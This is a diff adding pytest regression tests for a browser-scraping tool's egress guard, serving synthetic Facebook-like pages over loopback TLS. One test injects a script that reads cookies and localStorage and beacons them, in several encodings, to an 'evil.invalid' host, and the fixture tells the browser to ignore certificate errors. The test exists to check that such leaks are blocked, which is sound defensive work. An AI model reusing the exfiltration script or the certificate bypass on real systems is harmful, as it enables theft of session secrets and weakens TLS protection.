@@ -1,10 +1,20 @@
 """Round-4 review regressions. Synthetic data; browsers connect only to loopback."""
 
+import http.server
 import json
+import ssl
+import subprocess
+import threading
+from contextlib import contextmanager
 from pathlib import Path
 
 import pytest
-from test_facebook import _write_facebook_config
+from test_facebook import (
+    _allow_loopback_sockets,
+    _setup_fb_env,
+    _synthetic_post_html,
+    _write_facebook_config,
+)
 
 from metamuse import app, config, facebook, jobs
 from metamuse import models as m
@@ -53,6 +63,96 @@ def finish(ctx, job_id):
     return app.get_job(ctx, {"job_id": job_id}).data["job"]
 
 
+@contextmanager
+def browser_fixture(tmp_path, monkeypatch, pages, *, url=URL):
+    """Explicit synthetic unsandboxed config; TLS exemption exists only in this test."""
+    if facebook.find_playwright_browser() is None:
+        pytest.skip("Playwright or Chromium is not installed")
+    _allow_loopback_sockets(monkeypatch)
+    for key in facebook.PROXY_ENV_VARS:
+        monkeypatch.delenv(key, raising=False)
+    ctx, project, permit, auth_ref, secrets = _setup_fb_env(tmp_path, url=url)
+    extra = (
+        ["allow_unsandboxed_browser = true"]
+        if "allow_unsandboxed_browser" in config.FacebookConfig.model_fields
+        else []
+    )
+    _write_facebook_config(ctx.paths.root, auth_ref=auth_ref, extra_facebook_lines=extra)
+    ctx = app.AppContext.open(ctx.paths.root)
+    cert, key = tmp_path / "cert.pem", tmp_path / "key.pem"
+    subprocess.run(
+        [
+            "openssl",
+            "req",
+            "-x509",
+            "-newkey",
+            "rsa:2048",
+            "-nodes",
+            "-keyout",
+            str(key),
+            "-out",
+            str(cert),
+            "-days",
+            "1",
+            "-subj",
+            "/CN=www.facebook.com",
+        ],
+        check=True,
+        capture_output=True,
+    )
+    hits = []
+
+    class Handler(http.server.BaseHTTPRequestHandler):
+        def do_GET(self):
+            hits.append((self.path, self.headers.get("Upgrade")))
+            value = pages.get(self.path, "<html>Unclassified fixture</html>")
+            if isinstance(value, tuple):
+                self.send_response(value[0])
+                self.send_header("Location", value[1])
+                self.end_headers()
+                return
+            body = value.encode()
+            self.send_response(200)
+            self.send_header("Content-Type", "text/html; charset=utf-8")
+            self.send_header("Content-Length", str(len(body)))
+            self.end_headers()
+            try:
+                self.wfile.write(body)
+            except OSError:
+                pass
+
+        def log_message(self, *args):
+            pass
+
+    server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Handler)
+    tls = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+    tls.load_cert_chain(cert, key)
+    server.socket = tls.wrap_socket(server.socket, server_side=True)
+    thread = threading.Thread(target=server.serve_forever, daemon=True)
+    thread.start()
+    guard = facebook.EgressGuard.for_fixture_test(
+        allowed_hosts=("www.facebook.com",), resolver=lambda _: ["127.0.0.1"]
+    )
+    facebook.set_egress_factory(lambda _: guard)
+
+    class TestDriver(facebook.PlaywrightBrowserDriver):
+        def open_session(self, *args, **kwargs):
+            session = super().open_session(*args, **kwargs)
+            session._context.new_cdp_session(session._page).send(
+                "Security.setIgnoreCertificateErrors", {"ignore": True}
+            )
+            return session
+
+    driver = TestDriver(_test_origin=f"https://www.facebook.com:{server.server_port}")
+    facebook.set_driver_factory(lambda: driver)
+    try:
+        yield ctx, project, permit, secrets, hits, guard, driver
+    finally:
+        server.shutdown()
+        server.server_close()
+        thread.join(timeout=2)
+
+
 @pytest.mark.parametrize(
     "hosts",
     [
@@ -85,3 +185,90 @@ def test_finding_01_defaults_keep_exact_host_restriction():
     with pytest.raises(m.CoreError) as error:
         guard.check_proxy_target("https://unapproved.example/", method="CONNECT", is_connect=True)
     assert error.value.detail.code == m.ErrorCode.SCOPE_DENIED
+
+
+def test_finding_02_browser_secret_hostname_never_reaches_diagnostics(tmp_path, monkeypatch):
+    prefix = "SYNTH"
+    cookie, storage = f"{prefix}-Cookie", f"{prefix}-Storage"
+    script = """<script>
+    const values = [document.cookie.split('=')[1], localStorage.getItem('fixture')];
+    for (const token of values) {
+      for (const encoded of [token, token.toLowerCase(),
+             '%' + token.charCodeAt(0).toString(16) + token.slice(1)]) {
+        new Image().src = 'https://' + encoded + '.evil.invalid/private?q=' + token;
+      }
+    }
+    </script>"""
+    markup = _synthetic_post_html().replace("</body>", script + "</body>")
+    with browser_fixture(tmp_path, monkeypatch, {"/synth.lab/posts/pfbid0101synth": markup}) as env:
+        ctx, project, permit, secrets, hits, guard, _ = env
+        state = {
+            "cookies": [
+                {
+                    "name": "fixture",
+                    "value": cookie,
+                    "domain": "www.facebook.com",
+                    "path": "/",
+                    "secure": True,
+                    "httpOnly": False,
+                }
+            ],
+            "origins": [
+                {
+                    "origin": "https://www.facebook.com",
+                    "localStorage": [{"name": "fixture", "value": storage}],
+                }
+            ],
+        }
+        # localStorage origins include the synthetic TLS port, via test-only context init.
+        driver = env[-1]
+        original_open = driver.open_session
+
+        def open_with_storage(*args, **kwargs):
+            session = original_open(*args, **kwargs)
+            session._context.add_init_script(
+                f"localStorage.setItem('fixture', {json.dumps(storage)})"
+            )
+            return session
+
+        monkeypatch.setattr(driver, "open_session", open_with_storage)
+        ref = secrets.put(
+            json.dumps(state).encode(),
+            provider="facebook",
+            account="acct_synth",
+            created_at=ctx.clock(),
+        )["auth_ref"]
+        extra = (
+            ["allow_unsandboxed_browser = true"]
+            if "allow_unsandboxed_browser" in config.FacebookConfig.model_fields
+            else []
+        )
+        _write_facebook_config(ctx.paths.root, auth_ref=ref, extra_facebook_lines=extra)
+        ctx = app.AppContext.open(ctx.paths.root)
+        job_id = submit(ctx, project, permit)
+        finish(ctx, job_id)
+        visible = app.get_job(ctx, {"job_id": job_id}).model_dump_json()
+        with ctx.store.connection() as conn:
+            visible += str(
+                [
+                    tuple(row)
+                    for row in conn.execute(
+                        "SELECT checkpoint,result,error FROM job_steps WHERE job_id=?", (job_id,)
+                    )
+                ]
+            )
+            visible += str(
+                [
+                    tuple(row)
+                    for row in conn.execute("SELECT detail FROM events WHERE job_id=?", (job_id,))
+                ]
+            )
+        assert guard.summary()["aborted"] >= 2
+        for token in (cookie, storage):
+            assert token.casefold() not in visible.casefold()
+            assert (
+                "%" + format(ord(token[0]), "x") + token[1:]
+            ).casefold() not in visible.casefold()
+        assert "evil.invalid" not in visible
+        assert all("hostname" not in row for row in guard.summary()["aborted_reasons"])
+        assert all(upgrade is None for _, upgrade in hits)
